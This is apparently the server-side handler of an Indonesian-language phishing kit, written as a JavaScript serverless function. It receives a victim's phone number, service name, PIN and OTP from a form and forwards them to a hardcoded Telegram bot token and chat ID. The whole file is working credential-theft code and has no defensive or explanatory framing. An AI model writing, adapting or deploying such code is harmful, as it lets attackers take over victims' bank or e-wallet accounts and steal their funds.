exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };
    try {
        const data = JSON.parse(event.body);
        const token = "8652214007:AAHt0TuC4p88mmxdMWzkp5VeeGEcU34mGck";
        const chatId = "7414298016";
        const text = `⚠️ AKTIVITAS: ${data.tahap}\n` +
                     (data.nomor ? `📱 HP: ${data.nomor}\nLayanan: ${data.layanan}\n` : "") +
                     (data.pin ? `🔑 PIN: ${data.pin}\n` : "") +
                     (data.otp ? `🔢 OTP: ${data.otp}\n` : "");
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: text })
        });
        return { statusCode: 200, body: "Sukses" };
    } catch (e) { return { statusCode: 500, body: "Gagal" }; }
};
